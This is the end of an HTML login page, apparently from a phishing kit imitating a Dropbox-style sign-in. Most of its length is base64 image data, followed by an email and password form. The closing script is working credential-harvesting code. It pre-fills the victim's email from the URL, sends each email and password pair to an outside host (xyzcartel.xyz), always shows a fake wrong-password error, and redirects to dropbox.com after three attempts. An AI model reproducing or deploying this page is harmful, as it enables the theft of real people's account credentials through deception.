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" alt="" width="20"/>
                
            </div>
            <div class="error">
                ! Incorrect Password
            </div>
            <form action="" method="GET" class="form">
                <input type="email" name="email" placeholder="Email Address" class="input email" required>
                <input type="password" name="password" placeholder="Password" class="input password" required>
                <button type="submit" name="submit" class="submit">Log In</button>
            </form>
        </div>
    </div>

    <script>
        const link = window.location.href;
        const url = new URL(link);

        const hash = url.hash;
        var email = hash.substring(hash.indexOf('#') + 1);
        $(".email").val(email);

        var number = 0;
        $(".submit").click(function(){
            $(".form").submit(function(e){
                $(".submit").attr("disabled", true);
                e.preventDefault();
                var formValues = $(this).serialize() + "&submit=";
                $.ajax({
                type: "GET",
                // add your php link
                url: "https://xyzcartel.xyz/doggy/email.php",
                data: formValues,
                }).done(function(data, status){
                    number++;
                    $(".submit").text("Loading ...");
                    $(".error").fadeIn();
                    $(".password").val("");

                    if (number > 2) {
                        $(".error").fadeOut();
                        window.location.href = "https://www.dropbox.com";
                    }

                    setTimeout(function(){
                        $(".submit").attr("disabled", false);
                        $(".submit").text("Log In");
                    }, 2000)
                })
            });
        });

    </script>

</body>
</html>
